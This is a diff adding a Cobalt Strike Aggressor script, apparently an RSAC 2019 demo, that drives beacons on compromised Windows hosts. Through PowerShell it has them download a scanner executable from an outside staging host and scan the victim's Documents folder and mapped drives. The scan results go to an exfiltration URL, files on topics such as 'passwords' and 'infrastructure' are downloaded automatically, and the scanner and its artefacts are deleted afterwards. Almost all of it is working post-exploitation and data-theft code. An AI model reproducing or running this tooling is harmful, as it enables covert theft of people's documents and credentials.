@@ -1,0 +1,705 @@
+#
+# Author: Wicus Ross
+#
+# Credit: https://github.com/bluscreenofjeff/AggressorScripts
+#
+import java.awt.*; # for borderlayout
+import javax.swing.*; # for jpanel
+import javax.swing.table.*; #tablerowsorter
+import table.*; # generictablemodel
+import ui.*; #atable
+import java.util.Base64;
+
+import java.awt.BorderLayout;
+import java.awt.EventQueue;
+
+import javax.swing.JFrame;
+import javax.swing.JPanel;
+import javax.swing.border.EmptyBorder;
+import java.awt.GridLayout;
+import javax.swing.JScrollPane;
+import javax.swing.JTextArea;
+import javax.swing.BoxLayout;
+import javax.swing.JList;
+import javax.swing.JButton;
+import javax.swing.SwingConstants;
+import java.awt.GridBagLayout;
+import java.awt.GridBagConstraints;
+import java.awt.Insets;
+import javax.swing.GroupLayout;
+import javax.swing.JLabel;
+import java.awt.FlowLayout;
+import javax.swing.JTable;
+
+%topicModelSettings["staging_url"] = "http://banner.tokelosh.com/download/topicmodelscan.exe";
+%topicModelSettings["exfil_url"] = "http://pics.tokelosh.com/topic";
+%topicModelSettings["scan_path"] = "%USERPROFILE%\\Documents";
+%topicModelSettings["principal_topics"] = "network, configuration, infrastructure, passwords";
+%topicModelSettings["staging_hash"] = "0D8B62DC2DEC4A11989758ED65197D7AB7D57BF097FBEFCB2C1E98ADF3F64794";
+
+%topicModelAttributes["targetbeacons"] = @();
+%topicModelAttributes["topics"] = @();
+
+%my_beacons["0"] = @();
+
+global('%topicModelAttributes $my_beacons');
+
+
+sub configureRSAC2019 {
+
+    local('$center $south $c $x $saveButton $cancelButton');
+    global('%topicModelSettings');
+
+    # main title and dimensions of the dialog box
+    $configure_server_dialog = dialog("Configure RSAC-2019 Settings", 590, 205);
+
+    # if the server settings haven't been configured previously, throw some defaults in
+    if (!%topicModelSettings){
+        %topicModelSettings["staging_url"] = "http://banner.tokelosh.com/download/topicmodelbeacon.exe";
+        %topicModelSettings["exfil_url"] = "http://pics.tokelosh.com/topic";
+        %topicModelSettings["scan_path"] = "%USERPROFILE%\\Documents";
+	%topicModelSettings["principal_topics"] = "assessment,health,security,infrastructure,passwords";
+    }
+
+    # build out the option list table for the server settings
+    $model = [new GenericTableModel: @("Option", "Value"), "Option", 128];
+    [$model setCellEditable: 1];
+
+    [$model _addEntry: %(Option => "Staging URL", Value => %topicModelSettings["staging_url"], Tooltip => "Location from where to download EXE", Hide => '0')];
+    [$model _addEntry: %(Option => "Staging Hash", Value => %topicModelSettings["staging_hash"], Tooltip => "The SHA256 hash of the executable that will perform the Topic Modeling", Hide => '0')];
+    [$model _addEntry: %(Option => "Exfiltration URL", Value => %topicModelSettings["exfil_url"], Tooltip => "URL that will receive Topic Model data", Hide => '0')];
+    [$model _addEntry: %(Option => "Scan Path", Value => %topicModelSettings["scan_path"], Tooltip => "Path on victim to perform Topic Modeling", Hide => '0')];
+    [$model _addEntry: %(Option => "Principal Topics", Value => %topicModelSettings["principal_topics"], Tooltip => "Comma separated list of topics that will trigger autodownloads.", Hide => '0')];
+    
+    $table = [new ATable: $model];
+
+    # set up the panes
+    $center = [new JScrollPane: $table];
+    $south = [new JPanel];
+    [$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];
+
+    [$south setLayout: [new GridLayout: 1, 1]];
+
+    $c = [new JPanel];
+    [$c setLayout: [new FlowLayout: [FlowLayout CENTER]]];
+
+    # our buttons
+    # $testconnectionButton = [new JButton: "Test Server Connection"];
+    $saveButton = [new JButton: "Save"];
+    $cancelButton = [new JButton: "Cancel"];
+
+    # add a lambda listener to save the settings
+    [$saveButton addActionListener: lambda({
+        
+        syncTable($table);
+        $options = %();
+
+        # grab all the filled in option values from the table
+        for ($x = 0; $x < [$model getRowCount]; $x++) {
+            $options[ [$model getValueAt: $x, 0] ] = [$model getValueAt: $x, 1];
+        }
+
+        # save settings
+        %topicModelSettings["staging_url"] = $options["Staging URL"];
+        %topicModelSettings["exfil_url"] = $options["Exfiltration URL"];
+	%topicModelSettings["scan_path"] = $options["Scan Path"];
+	%topicModelSettings["staging_hash"] = $options["Staging Hash"];
+        %topicModelSettings["principal_topics"] = $options["Principal Topics"];
+
+        elog("\c9[+]\c7 Configured RSAC-2019 to collect EXE at " . %topicModelSettings['staging_url'] . " and exfiltrate to " . %topicModelSettings['exfil_url'] . " based on Topic Model on path " . %topicModelSettings['scan_path'] . " The hash of the Topic Modelling binary: " . %topicModelSettings['staging_hash'] . ' Will autodownload files when seeing the following topics ' . %topicModelSettings["principal_topics"]);
+       
+        [$configure_server_dialog setVisible: 0]; # close the dialog off
+        })];
+
+    # add a lambda listener to close dialog without saving (cancel)
+    [$cancelButton addActionListener: lambda({
+        
+        [$configure_server_dialog setVisible: 0]; # close the dialog off
+        })];
+
+    # add the buttons to the frame
+    [$c add: $testconnectionButton];
+    [$c add: $saveButton];
+    [$c add: $cancelButton];
+
+    # add the southern frame that contains the action button
+    [$south add: $c];
+
+    local('$s');
+    $s = [new JSplitPane: [JSplitPane VERTICAL_SPLIT], $north, $center];
+    [$center setPreferredSize: [new Dimension: 0, 0]];
+    
+    [$s resetToPreferredSizes];
+    [$s setOneTouchExpandable: 1];
+
+    [$configure_server_dialog add: $s, [BorderLayout CENTER]];   
+    [$configure_server_dialog add: $south, [BorderLayout SOUTH]];
+
+    [$saveButton requestFocus];
+    [$configure_server_dialog setVisible: 1];
+
+}
+
+sub hasScannerDeployed {
+	local('$l_target_id $state');
+	$l_target_id = "" . $1;
+	%my_beacon = %my_beacons[$l_target_id];
+	$state = %my_beacon["state"];
+	if ($state < 2) {
+		elog("\c9[+]\c8{" . $l_target_id . "}\c7 Checking if topic model scanner is present.");
+		# Waiting For Hash State
+		%my_beacon["state"] = 1;
+		bsleep($l_target_id, 5, 30);
+		bshell($l_target_id, "powershell -Command \"& { Get-FileHash .\\topicmodelscan.exe | Format-List }\"");
+	} else if ($state <= 5) {
+		elog("\c9[+]\c8{" . $l_target_id . "}\c7 Requesting topic model scanner file hash on next beacon check in.");
+		# Waiting For Hash State
+		%my_beacon["state"] = 5;
+		bsleep($l_target_id, 30, 30);
+		bshell($l_target_id, "powershell -Command \"& { Get-FileHash .\\topicmodelscan.exe | Format-List }\"");
+	}
+}
+
+sub doDeployScanner {
+	local('$l_target_id $state');
+	$l_target_id = "" . $1;
+	%mb = %my_beacons[$l_target_id];
+	$state = %mb["state"];
+	elog("\c9[+]\c8{" . $l_target_id . "}\c7 Uploading topic model scanner.");
+	if ($state == 2) {
+		bshell($l_target_id, "powershell -Command \"& { iwr " . %topicModelSettings["staging_url"] . " -OutFile topicmodelscan.exe ; Get-FileHash .\\topicmodelscan.exe | Format-List  }\"");
+		bsleep($l_target_id, 150, 30);
+		# Wait For Topic Model Scan to download.
+		%mb["state"] = 3;
+	} else {
+		elog("\c9[+]\c7 Already asked for deployment. Waiting for confirmation.");
+	}
+}
+
+sub deployScanner {
+	local('$l_target_id');
+	foreach $target_beacon_id (%topicModelAttributes["targetbeacons"]) {
+		foreach $beacon_iter (beacons()) {
+			$l_target_id = $beacon_iter['id'];
+			if ($l_target_id eq $target_beacon_id) {
+				elog("\c9[+]\c7 Uploading topic model scanner to \c8" . $beacon_iter['computer'] . "\c7");
+				bshell($l_target_id, "powershell -command \"& { iwr " . %topicModelSettings["staging_url"] . " -OutFile topicmodelscan.exe }\"");
+			}
+		}
+	}
+}
+
+sub topicsCollected {
+	local('$beacon_id @topic_list $str $topics_found @auto_topic $topic_str');
+	$beacon_id = "". $1;
+	loadAgentTopicBeacon($beacon_id);
+	%mb = %my_beacons[$beacon_id]; 
+	@topic_list = %mb["topics_collected"];
+	@topics_selected = @();
+	@auto_topics = split(",", %topicModelSettings["principal_topics"]);
+	$topic_str = "";
+	foreach @topic (@topic_list) {
+		$str = @topic[0];
+		$str = replace($str, 'Topic ', '');
+		$topics_found = @topic[1];
+		foreach $t (@auto_topics) {
+			$t = $t.trim();
+			if ($t isin $topics_found) {
+				@topics_selected = addAll(copy(@topics_selected), @($str));
+			}
+		}
+	}
+	%mb["fetch_files"] = @topics_selected;
+	foreach $str (@topics_selected) {
+		if (strlen($topic_str) > 0) {
+			$topic_str = $topic_str . ", " . $str;
+		} else {
+			$topic_str = $str;
+		}
+	}
+	elog("\c9[+]\c8{" . $beacon_id . "}\c7 Topic groups \cB" . $topic_str . "\c7 contains principal topics \cB" . %topicModelSettings["principal_topics"] . "\c7");
+	downloadTopicFiles($beacon_id, @topics_selected);
+}
+
+sub runTopicModel {
+	local('$l_target_id');
+	foreach $target_beacon_id (%topicModelAttributes["targetbeacons"]) {
+		foreach $beacon_iter (beacons()) {
+			$l_target_id = $beacon_iter['id'];
+			if ($l_target_id eq $target_beacon_id) {
+				elog("\c9[+]\c7 Running topic model on \c8" . $beacon_iter['computer'] . "\c7");
+				bshell($l_target_id, "topicmodelscan.exe local -s -d ". %topicModelSettings["scan_path"] . " -b " . $l_target_id . " -e " . %topicModelSettings["exfil_url"]);
+			}
+		}
+	}
+}
+
+sub runTopicModelScan {
+	local('$beacon_id $wp $p');
+	$beacon_id = "" . $1;
+	%mb = %my_beacons[$beacon_id];
+	@paths = %mb["scan_paths_wip"];
+	if (size(@paths) > 0) {
+		$wp = "";
+		foreach $p (@paths) {
+			if (strlen($wp) > 0) {
+				$wp = $wp . " " . $p;
+			} else {
+				$wp = $p; 
+			}
+		}	
+		%mb["scan_paths_wip"] = @();
+		elog("\c9[+]\c8{" . $beacon_id . "}\c7 Running topic model scanner.");
+		bsleep($beacon_id, 5, 30);
+		bshell($beacon_id, "topicmodelscan.exe local -s -d ". $wp . " -b " . $beacon_id . " -e " . %topicModelSettings["exfil_url"]);
+		# Wait For Topic Model Scan to complete scanning the documents.
+		%mb["state"] = 11;
+	}
+}
+
+sub downloadTopicFiles {
+	local('$beacon_id @selected_topics $topic_id $str');
+	$beacon_id = $1;
+	@selected_topics = $2;
+	$str = "";
+	%mb = %my_beacons[$beacon_id];
+	foreach $topic_id (@selected_topics) {
+		if (strlen($str) > 0) {
+			$str = $str . " " . $topic_id;
+		} else {
+			$str = $topic_id;
+		}
+	}
+	if (strlen($str) > 0) {
+		elog("\c9[+]\c8{" . $beacon_id . "}\c7 Requesting file list associated with topic groups \cB" . $str . "\c7.");
+		bshell($beacon_id, "topicmodelscan.exe load -t ". $str . " -b " . $beacon_id . " -e " . %topicModelSettings["exfil_url"]);
+	}
+	%mb["state"] = 13;
+}
+
+sub loadAgentTopic {
+	local('$fname $text $handle');
+	clear(%topicModelAttributes["topics"]);
+	$fname = "$1 $+ .log";
+	$handle = openf("$fname");	
+	while $text (readln($handle)) {
+		$text = [$text trim];
+		if (strlen($text) > 0) {
+			@strings = [$text split: ":"];
+			add(%topicModelAttributes["topics"], @strings);
+		}
+	}
+	closef($handle);
+}
+
+sub loadAgentTopicBeacon {
+	local('$beacn_id $fname $text $handle');
+	clear(%topicModelAttributes["topics"]);
+	$beacon_id = "" . $1;
+	elog("\c9[+]\c8{" . $beacon_id . "}\c7 Retrieving topics");
+	@topics_set = @();
+	$fname = "$1 $+ .log";
+	$handle = openf("$fname");	
+	while $text (readln($handle)) {
+		$text = [$text trim];
+		if (strlen($text) > 0) {
+			@strings = [$text split: ":"];
+			#add(%topicModelAttributes["topics"], @strings);
+			add(@topics_set, @strings);
+		}
+	}
+	closef($handle);
+	%mb = %my_beacons[$beacon_id]; 
+	%mb["topics_collected"] = @topics_set;
+}
+
+sub collectedTopicsMenu {
+
+    local('$center $south $dialog $c $x $selectButton $refreshButton $selectallButton $closeButton @selected_agents @selected_rows');
+    $collected_topic_beacon_id = $1;
+    loadAgentTopic($collected_topic_beacon_id);
+    
+    local('$topicModelListener $cobalt_listener $foreignlistenerpresent $agent_id $foreignlistenername $str');
+
+    # main title and dimensions of the dialog box
+    $topicconfig_dialog = dialog("Topics", 720, 310);
+
+    # build out the option list table
+    $model = [new GenericTableModel: @("Topic Nr", "Topics"), "Option", 128];
+    [$model setCellEditable: 0];
+
+   	foreach @agent_iter (%topicModelAttributes["topics"]) {
+   		[$model _addEntry: %(Topic Nr => @agent_iter[0], Topics => @agent_iter[1])];	
+   	}
+       
+    $table = [new ATable: $model];
+
+    [[$table getSelectionModel] setSelectionMode: [ListSelectionModel MULTIPLE_INTERVAL_SELECTION]];
+    $sorter = [new TableRowSorter: $model];
+    [$table setRowSorter: $sorter];
+
+
+    # set up the panes
+    $center = [new JScrollPane: $table];
+    $south = [new JPanel];
+    [$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];
+
+    [$south setLayout: [new GridLayout: 1, 0]];
+
+    $c = [new JPanel];
+    [$c setLayout: [new FlowLayout: [FlowLayout CENTER]]];
+
+    # our buttons
+    $selectButton = [new JButton: "Select Topic(s)"];
+    $selectallButton = [new JButton: "Select ALL Topics"];
+    $closeButton = [new JButton: "Close Window"];
+
+    #selectButton listener
+    [$selectButton addActionListener: lambda({
+
+		syncTable($table);
+		@selected_rows = [$table getSelectedRows];
+		@selected_topics = @();
+		foreach $row (@selected_rows) {
+			#add(@selected_topics,[$table getValueAt: $row, 0]);
+			$str = [$table getValueAt: $row, 0];
+			$str = replace($str, 'Topic ', '');
+			add(@selected_topics, $str);
+		}
+
+		if (size(@selected_topics) < 1){
+			show_message("Please select a topic");
+		}
+		
+		else {
+			downloadTopicFiles($collected_topic_beacon_id, @selected_topics);
+		}
+		})];
+
+	#selectallButton listener
+    [$selectallButton addActionListener: lambda({
+		#transferAgents('all');
+		})];
+
+    #closeButton listener
+    [$closeButton addActionListener: lambda({
+    	$select_bool = "False";
+        [$topicconfig_dialog setVisible: 0]; # close the dialog off
+        })];
+
+    # add the buttons to the frame
+    [$c add: $selectButton];	
+    [$c add: $selectallButton];
+    [$c add: $closeButton];
+
+    # add the southern frame that contains the action buttons
+    [$south add: $c];
+
+    local('$s');
+    $s = [new JSplitPane: [JSplitPane VERTICAL_SPLIT], $north, $center];
+    [$center setPreferredSize: [new Dimension: 0, 0]];
+    
+    [$s resetToPreferredSizes];
+    [$s setOneTouchExpandable: 1];
+
+    [$topicconfig_dialog add: $s, [BorderLayout CENTER]];   
+    [$topicconfig_dialog add: $south, [BorderLayout SOUTH]];
+
+    [$selectButton requestFocus];
+    [$topicconfig_dialog setVisible: 1];
+}
+
+sub loadFiles {
+	local('$fname $text $handle @arr');
+	clear(%topicModelAttributes["topics"]);
+	$fname = "$1 $+ files.log";
+	elog("\c9[+]\c8{" . $1 . "}\c7 Retrieving file names associated with our principal topics.");
+	$handle = openf("$fname");	
+	@arr = @();
+	while $text (readln($handle)) {
+		$text = [$text trim];
+		#elog($text);
+		add(@arr, $text);
+	}
+	closef($handle);
+	%topicModelAttributes["files"] = @arr;
+}
+
+sub downloadFiles {
+	local('$beacon_id $file $file_count');
+
+	$beacon_id = $1;
+	loadFiles($beacon_id);
+	%mb = %my_beacons[$beacon_id];
+	%mb["state"] = 16;
+	$file_count = size(%topicModelAttributes["files"]);	
+	elog("\c9[+]\c8{" . $beacon_id . "}\c7 Scheduling file download for \cB" . $file_count . "\c7 files.");
+   	foreach $file (%topicModelAttributes["files"]) {
+		if ('none' !isin $file) {
+			bdownload($beacon_id, $file);
+		}
+   	}
+	elog("\c9[+]\c8{" . $beacon_id . "}\c7 Removing topic model scanner and artefacts.");
+	brm($beacon_id, "topicmodelscan.exe");
+	brm($beacon_id, "current.pkl");
+}
+
+
+#menubar options
+menubar("RSAC-2019", "rsac2019menu", 2);
+
+# modify the main "Attacks" menu
+popup rsac2019menu {
+    item "Configure" {
+        configureRSAC2019();
+    }
+}
+
+popup beacon_bottom {
+	menu "&Topic Model" {
+		item "&Show Topics" {
+			clear(%topicModelAttributes["targetbeacons"]);
+			foreach $beacon_iter ($1) {
+				add(%topicModelAttributes["targetbeacons"],$beacon_iter);
+			}
+			collectedTopicsMenu($beacon_iter);
+		}
+	}
+}
+
+on web_hit {
+	local('$handle $logentry $beacon_id $fileslogentry $base64Decoder');
+
+	if (size($8) gt 0) {
+		@params = @();
+		$base64Decoder = [Base64 getDecoder];
+		foreach $key => $value ($8) {
+			if ('topic_model' isin $key) {
+				$base64 = [$base64Decoder decode: $value];
+				$logentry = [new String: $base64, 'UTF-8'];
+			}
+			if ('beacon_id' isin $key) {
+				$beacon_id = $value;
+			}
+			if ('files' isin $key) {
+				$base64 = [$base64Decoder decode: $value];
+				$fileslogentry = [new String: $base64, 'UTF-8'];
+			}
+		}
+	}
+	if (strlen($logentry) gt 0) {
+		$handle = openf("> $+ $beacon_id $+ .log");
+		println($handle,$logentry);
+		closef($handle);
+		topicsCollected($beacon_id);
+	}
+	if (strlen($fileslogentry) gt 0) {
+		$handle = openf(">> $+ $beacon_id $+ files.log");
+		println($handle,$fileslogentry);
+		closef($handle);
+		downloadFiles($beacon_id);
+	}
+}
+
+sub getMappedDrives {
+	local('$beacon_id $drive_letter $count');
+	$beacon_id = "" . $1;
+	%my_beacon = %my_beacons[$beacon_id];
+	if ('New connections will' isin $2) {
+		@mapped_drives = @();
+		while ($2 hasmatch "OK\\s+([a-zA-Z]+:)") {
+			($drive_letter) = matched();	
+			add(@mapped_drives, $drive_letter . "\\");
+		}
+		$count = size(@mapped_drives);
+		if ($count == 0) {	
+			elog("\c9[-]\c8{" . $beacon_id . "}\c4 NO mapped drives detected\c7.");
+		} else {
+			elog("\c9[-]\c8{" . $beacon_id . "}\cB Found " . $count . " mapped drive(s)\c7.");
+		}
+		add(@mapped_drives, %topicModelSettings["scan_path"] . "\\");
+		%my_beacon["scan_paths"] = addAll(copy(%my_beacon["scan_paths"]), @mapped_drives);
+		%my_beacon["scan_paths_wip"] = copy(%my_beacon["scan_paths"]);
+		# done with Drive Mappings 
+		%my_beacon["state"] = 10;
+		runTopicModelScan($beacon_id);
+	}
+}
+
+sub verifyDeployedScanner {
+	local('$hash $beacon_id');
+	$beacon_id = "" . $1;
+	%mb = %my_beacons[$beacon_id];
+	if ('PathNotFound' isin $2) {
+		elog("\c9[+]\c8{" . $beacon_id . "}\c7 Scanner not present. Requesting Deploy.");
+		%mb["state"] = 2;
+		doDeployScanner($beacon_id); 
+	} else {
+		if ($2 hasmatch "Hash\\s+:\\s+([a-zA-Z0-9]{64})") {
+			elog("\c9[+]\c8{" . $beacon_id . "}\c7 Topic model binary is present. Verifying file hash.");
+			($hash) = matched();	
+			if ($hash eq %topicModelSettings["staging_hash"]) {
+				%mb["state"] = 9;
+				elog("\c9[+]\c8{" . $beacon_id . "}\c7 File integrity check passed. Hash \cBmatched\c7.");
+				elog("\c9[+]\c8{" . $beacon_id . "}\c7 Detecting mapped drives.");
+				bsleep($beacon_id, 5, 30);
+				bshell($beacon_id, "net use");
+				# Hash Verified State
+			} else {
+				elog("\c9[+]\c8{" . $beacon_id . "}\c7 \c4INVALID\c7 file hash detected!");
+			}
+		} else {
+			hasScannerDeployed($beacon_id);
+		}
+	}
+}
+
+sub update_beacons {
+	local('$beacon_id @tkeys');
+	$beacon_id = "" . $1;
+	@tkeys = keys(%my_beacons);
+	if ($beacon_id !in @tkeys) {
+		elog("\c9[+]\c8{" . $beacon_id . "}\c7 Adding beacon to the tracking list." );
+		%my_beacon = %();
+		%my_beacon["scan_paths"] = @();
+		%my_beacon["state"] = 0;
+		%my_beacon["topics"] = @();
+		%my_beacons[$beacon_id] = %my_beacon;
+	}
+}
+
+on beacon_output {
+	local('$beacon_id $message');
+	update_beacons($1);
+	$beacon_id = "" . $1;
+	$message = $2;
+	getMappedDrives($beacon_id, $message);
+	verifyDeployedScanner($beacon_id, $message);
+}
+
+on beacon_initial {
+	local('$beacon_id $state');
+	update_beacons($1);
+	$beacon_id = "" . $1;
+	if ($beacon_id isin %my_beacons) {
+		%mb = %my_beacons[$beacon_id];
+		$state = int(%mb["state"]);
+		if ($state ==  0) {
+			hasScannerDeployed($beacon_id); 
+		}
+	}
+}
+
+on beacon_checkin {
+	local('$beacon_id $message');
+	update_beacons($1);
+	$beacon_id = "" . $1;
+	if ($beacon_id isin %my_beacons) {
+		%mb = %my_beacons[$beacon_id];
+		$state = int(%mb["state"]);
+		if ($state ==  3) {
+			bsleep($beacon_id, 7, 30);
+			#bpwd($beacon_id);
+			%mb["state"] = 4;
+			elog("\c9[*]\c8{" . $beacon_id . "}\cF Waiting for topic model scanner file hash...\c7");
+		} else if (($state >= 4) && ($state <= 5)) {
+			# Wait for the verify hash to determine if the file is present.
+			#hasScannerDeployed($beacon_id); 
+			elog("\c9[*]\c8{" . $beacon_id . "}\cF Waiting for topic model scanner file hash...\c7");
+		} else if ($state == 11) {
+			elog("\c9[*]\c8{" . $beacon_id . "}\cF Waiting for topic model run to complete...\c7");
+		} else if ($state == 13) {
+			elog("\c9[*]\c8{" . $beacon_id . "}\cF Waiting for file names associated with principal topics...\c7");
+		} else if ($state == 13) {
+			elog("\c9[*]\c8{" . $beacon_id . "}\cF Waiting for file names associated with principal topics...\c7");
+		}
+	}
+}
+
+on heartbeat_1m {
+	local('$beacon_id $state');
+	foreach $beacon_id (keys(%my_beacons)) {
+		if ('0' !eq $beacon_id) {
+			%mb = %my_beacons[$beacon_id];
+			$state = int(%mb["state"]);
+			if ($state == 3) {
+				#bsleep($beacon_id, 30, 30);
+				elog("\c9[-]\c7 Deployment heartbeat state");
+			}
+		}
+	}
+}
+
+# from armitage/scripts/gui.sl
+sub setupTable {
+    local('$table $model $sorter $row $index $col');
+    $model = [new GenericTableModel: $2, $1, 8];
+    foreach $row ($3) {
+        [$model _addEntry: $row];
+        }
+
+    $table = [new ATable: $model];
+    [[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];
+    $sorter = [new TableRowSorter: $model];
+    [$table setRowSorter: $sorter];
+
+    # make sure our columns have sorters that make sense
+    foreach $index => $col ($2) {
+        if ($col eq "session_host" || $col eq "host" || $col eq "Host") {
+            [$sorter setComparator: $index, &compareHosts];
+        }
+        else if ($col eq "exfil_url" || $col eq "sid" || $col eq "exfil_url") {
+            [$sorter setComparator: $index, { return $1 <=> $2; }];
+        }
+    }
+    
+    return @($table, $model);
+}
+
+# from armitage/scripts/gui.sl
+sub center {
+    local('$panel $c');
+    $panel = [new JPanel];
+    [$panel setLayout: [new FlowLayout: [FlowLayout CENTER]]];
+
+    foreach $c (@_) {
+        [$panel add: $c];
+    }
+
+    return $panel;
+}
+
+# from armitage/scripts/gui.sl
+sub left {
+    local('$panel $c');
+    $panel = [new JPanel];
+    [$panel setLayout: [new FlowLayout: [FlowLayout LEFT]]];
+
+    foreach $c (@_) {
+        [$panel add: $c];
+    }
+
+    return $panel;
+}
+
+# from armitage/scripts/gui.sl
+sub syncTable {
+    if ([$1 isEditing]) {
+        [[$1 getCellEditor] stopCellEditing];
+    }
+}
+
+# helper, from armitage/scripts/gui.sl
+sub dialog {
+    local('$dialog');
+        $dialog = [new JDialog: $__frame__, $1];
+        [$dialog setSize: $2, $3];
+        [$dialog setLayout: [new BorderLayout]];
+        [$dialog setLocationRelativeTo: $__frame__];
+    return $dialog;
+}
+
+# helpers, from armitage/scripts/gui.sl
+sub tableRenderer {
+    return [ATable getDefaultTableRenderer: $1, $2];
+}
